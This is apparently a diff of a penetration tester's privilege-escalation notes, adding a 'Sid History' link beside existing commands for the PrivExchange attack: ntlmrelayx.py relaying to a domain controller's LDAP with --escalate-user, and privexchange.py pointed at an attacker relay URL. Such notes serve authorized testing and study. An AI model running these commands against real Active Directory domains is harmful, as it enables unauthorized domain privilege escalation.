@@ -82,5 +82,8 @@ PrivEsc
     ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
     ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
     python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
+    
+  Sid History
+    https://adsecurity.org/?p=1640
  
  Artfact,PS_Log,Term_Log,CS_log [gui+cmd],CherTree
